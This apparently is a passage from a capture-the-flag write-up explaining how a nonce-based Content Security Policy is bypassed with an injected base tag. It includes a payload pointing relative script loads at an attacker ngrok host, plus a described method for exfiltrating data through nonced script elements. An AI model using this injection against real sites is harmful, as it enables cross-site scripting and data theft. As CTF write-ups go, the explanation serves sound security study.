<p>It was pretty obvious that we had to perform an XSS here, but the Content Security Policy had to be bypassed.</p>

<p><code>markup
&lt;meta http-equiv="Content-Security-Policy" content="default-src 'self'; 
    script-src 'self' 'nonce-2ac41eb7-a3d1-4f8b-a06d-369e439ff08f'; 
    img-src 'self' ext.captcha.yandex.net"&gt;
</code></p>

<p>I noticed that near the bottom of the page, relative JavaScript paths are used.</p>

<p>```markup</p>

<script nonce="2ac41eb7-a3d1-4f8b-a06d-369e439ff08f" src="/static/jquery.min.js" crossorigin="anonymous"></script>

<script nonce="2ac41eb7-a3d1-4f8b-a06d-369e439ff08f" src="/static/bootstrap.min.js" crossorigin="anonymous"></script>

<script nonce="2ac41eb7-a3d1-4f8b-a06d-369e439ff08f" src="/static/page.js" crossorigin="anonymous"></script>

<p>```</p>

<p>We can make use of the <code>nonce</code> in these script tags - these scripts will always be executed, because the CSP allows them based on their <code>nonce</code>.&#x20;</p>

<p>If we change the base URI of the page to our own attacker server, then these relative paths will now load scripts from our server, which is otherwise not possible due to the CSP.</p>

<p><code>&lt;base href=//351b-42-60-216-15.ngrok.io&gt;</code></p>

<p>The relative paths are now URLs under our attacker server, so if we simply host a file <code>/static/page.js</code> and enable CORS on our server, then we could execute arbitrary JS through this file.</p>

<p>In order to exfiltrate data, we still need to bypass the CSP once again. This is much simpler, now that we know the <code>nonce</code>. We could simply create a new script element and add the appropriate <code>nonce</code> obtained from the rest of the script tags. The script source can then be set to the data we want to exfiltrate.</p>
